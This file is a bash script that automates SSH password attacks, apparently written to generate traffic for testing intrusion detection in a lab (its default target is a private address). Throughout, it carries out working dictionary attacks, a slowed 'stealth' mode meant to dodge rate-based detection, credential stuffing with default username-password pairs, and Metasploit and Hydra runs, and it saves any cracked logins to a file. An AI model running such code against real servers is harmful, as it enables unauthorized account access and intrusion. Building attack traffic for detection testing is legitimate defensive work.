#!/bin/bash
###############################################################################
# Automated SSH Brute Force Attack Campaign
# Simulates realistic SSH brute-force attacks for detection testing
###############################################################################

set -e

# Configuration
TARGET="${TARGET_IP:-192.168.56.20}"
PORT="${TARGET_PORT:-22}"
WORDLIST="${WORDLIST:-/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt}"
USERLIST="${USERLIST:-/usr/share/metasploit-framework/data/wordlists/unix_users.txt}"
THREADS="${THREADS:-10}"
RATE="${RATE:-5}"  # Delay between attempts in seconds

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }

usage() {
    cat << EOF
SSH Brute Force Attack Automation Script
=========================================

Usage: $0 [OPTIONS]

Options:
    -t, --target IP        Target SSH server (default: $TARGET)
    -p, --port PORT        SSH port (default: $PORT)
    -w, --wordlist FILE    Password wordlist (default: $WORDLIST)
    -u, --userlist FILE    Username wordlist (default: $USERLIST)
    -n, --threads NUM      Number of threads (default: $THREADS)
    -r, --rate NUM         Delay between attempts in seconds (default: $RATE)
    -h, --help             Show this help message

Examples:
    $0 --target 192.168.56.20 --rate 1
    $0 -t 192.168.56.20 -p 2222 -n 20

EOF
    exit 0
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -t|--target) TARGET="$2"; shift 2 ;;
        -p|--port) PORT="$2"; shift 2 ;;
        -w|--wordlist) WORDLIST="$2"; shift 2 ;;
        -u|--userlist) USERLIST="$2"; shift 2 ;;
        -n|--threads) THREADS="$2"; shift 2 ;;
        -r|--rate) RATE="$2"; shift 2 ;;
        -h|--help) usage ;;
        *) log_error "Unknown option: $1"; exit 1 ;;
    esac
done

# Check prerequisites
check_prereqs() {
    log_info "Checking prerequisites..."

    if ! command -v ssh &> /dev/null; then
        log_error "SSH client not found"
        exit 1
    fi

    if [ ! -f "$WORDLIST" ]; then
        log_warn "Wordlist not found: $WORDLIST"
        log_info "Creating default wordlist..."
        mkdir -p "$(dirname "$WORDLIST")"
        cat > "$WORDLIST" << 'WORTLIST'
password
123456
admin
root
123456789
letmein
welcome
monkey
1234567
12345
1234
test
pass
guest
master
login
passw0rd
WORTLIST
    fi

    if [ ! -f "$USERLIST" ]; then
        log_warn "Userlist not found: $USERLIST"
        log_info "Creating default userlist..."
        cat > "$USERLIST" << 'USERLIST'
root
admin
user
test
guest
oracle
postgres
ubuntu
centos
debian
USERLIST
    fi

    log_success "Prerequisites OK"
}

# Verify target
verify_target() {
    log_info "Verifying target $TARGET:$PORT..."

    if timeout 5 bash -c "echo > /dev/tcp/$TARGET/$PORT" 2>/dev/null; then
        log_success "Target is reachable"
    else
        log_warn "Target may not be reachable (port check failed)"
    fi
}

# Single attempt brute force
brute_force_single() {
    local user="$1"
    local password="$2"
    local output

    output=$(sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=5 \
        -o BatchMode=yes \
        -o UserKnownHostsFile=/dev/null \
        "$user@$TARGET" -p "$PORT" "echo SUCCESS" 2>&1) || true

    if echo "$output" | grep -q "SUCCESS"; then
        log_success "Found credentials: $user:$password"
        echo "$user:$password" >> /tmp/found_credentials.txt
        return 0
    fi

    return 1
}

# Metasploit-based attack
metasploit_attack() {
    log_info "Starting Metasploit-based attack..."

    if ! command -v msfconsole &> /dev/null; then
        log_warn "Metasploit not installed, skipping..."
        return 1
    fi

    cat > /tmp/ssh_brute.rc << EOF
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $TARGET
set RPORT $PORT
set PASS_FILE $WORDLIST
set USER_FILE $USERLIST
set THREADS $THREADS
set VERBOSE true
set STOP_ON_SUCCESS false
run
exit
EOF

    msfconsole -r /tmp/ssh_brute.rc
}

# Hydra-based attack
hydra_attack() {
    log_info "Starting Hydra-based attack..."

    if ! command -v hydra &> /dev/null; then
        log_warn "Hydra not installed, skipping..."
        return 1
    fi

    log_info "Running hydra attack..."
    hydra -l root -P "$WORDLIST" \
        ssh://"$TARGET:$PORT" \
        -t "$THREADS" \
        -V \
        -f

    log_info "Hydra attack complete"
}

# Slow brute force (stealth mode)
slow_brute_force() {
    log_info "Starting slow brute force (stealth mode)..."

    local attempt=0
    local total_attempts=$(wc -l < "$WORDLIST")

    while IFS= read -r password; do
        attempt=$((attempt + 1))
        log_info "[$attempt/$total_attempts] Testing password: $password"

        # Try common usernames with this password
        while IFS= read -r user; do
            log_info "  Testing $user:$password"
            sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
                -o ConnectTimeout=3 \
                -o BatchMode=yes \
                -o UserKnownHostsFile=/dev/null \
                "$user@$TARGET" -p "$PORT" "echo SUCCESS" 2>/dev/null && {
                log_success "Found: $user:$password"
                echo "$user:$password" >> /tmp/found_credentials.txt
            }

            sleep "$RATE"
        done < "$USERLIST"

    done < "$WORDLIST"

    log_info "Slow brute force complete"
}

# Dictionary attack
dictionary_attack() {
    log_info "Starting dictionary attack..."

    local attempt=0
    local found=0

    while IFS= read -r line; do
        # Skip empty lines
        [ -z "$line" ] && continue

        # Try as user:password format
        if [[ "$line" == *":"* ]]; then
            user=$(echo "$line" | cut -d: -f1)
            password=$(echo "$line" | cut -d: -f2)
        else
            user="root"
            password="$line"
        fi

        attempt=$((attempt + 1))

        if [ $((attempt % 100)) -eq 0 ]; then
            log_info "Progress: $attempt attempts, $found successes"
        fi

        sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=2 \
            -o BatchMode=yes \
            -o UserKnownHostsFile=/dev/null \
            "$user@$TARGET" -p "$PORT" "echo SUCCESS" 2>/dev/null && {
            log_success "SUCCESS: $user:$password"
            echo "$user:$password" >> /tmp/found_credentials.txt
            found=$((found + 1))

            # Optionally stop on first success
            # break
        }

        sleep "$RATE"

    done < "$WORDLIST"

    log_info "Dictionary attack complete: $attempt attempts, $found successes"
}

# Credential stuffing attack
credential_stuffing() {
    log_info "Starting credential stuffing attack..."

    local credentials=(
        "admin:password"
        "admin:admin"
        "root:root"
        "root:toor"
        "test:test"
        "user:user"
        "oracle:oracle"
        "postgres:postgres"
    )

    for cred in "${credentials[@]}"; do
        IFS=':' read -r user password <<< "$cred"

        log_info "Testing $user:$password"

        sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=2 \
            -o BatchMode=yes \
            -o UserKnownHostsFile=/dev/null \
            "$user@$TARGET" -p "$PORT" "echo SUCCESS" 2>/dev/null && {
            log_success "SUCCESS: $user:$password"
            echo "$user:$password" >> /tmp/found_credentials.txt
        }

        sleep "$RATE"
    done
}

# Main menu
main_menu() {
    echo ""
    echo "=========================================="
    echo "  SSH Brute Force Attack Menu"
    echo "=========================================="
    echo "  Target: $TARGET:$PORT"
    echo "  Wordlist: $WORDLIST"
    echo "  Rate: $RATE seconds"
    echo "=========================================="
    echo ""
    echo "  1. Full dictionary attack"
    echo "  2. Metasploit attack"
    echo "  3. Hydra attack"
    echo "  4. Slow brute force (stealth)"
    echo "  5. Credential stuffing"
    echo "  6. Single user/password test"
    echo "  7. Custom attack"
    echo "  8. All attacks"
    echo "  0. Exit"
    echo ""
    read -p "Select attack type: " choice

    case $choice in
        1) dictionary_attack ;;
        2) metasploit_attack ;;
        3) hydra_attack ;;
        4) slow_brute_force ;;
        5) credential_stuffing ;;
        6) echo "Enter username:"; read user; echo "Enter password:"; read pass; brute_force_single "$user" "$pass" ;;
        7) echo "Custom - enter custom command"; read cmd; eval "$cmd" ;;
        8)
            log_info "Running all attack types..."
            dictionary_attack
            slow_brute_force
            credential_stuffing
            ;;
        0) exit 0 ;;
        *) log_error "Invalid option"; exit 1 ;;
    esac
}

# Main execution
main() {
    echo ""
    echo "╔══════════════════════════════════════════╗"
    echo "║   SSH BRUTE FORCE ATTACK SIMULATION      ║"
    echo "║   For Educational/Testing Purposes Only   ║"
    echo "╚══════════════════════════════════════════╝"
    echo ""

    check_prereqs
    verify_target

    if [ -t 0 ]; then
        # Interactive mode
        main_menu
    else
        # Non-interactive mode - run full attack
        log_info "Running in non-interactive mode..."
        dictionary_attack
    fi
}

main "$@"
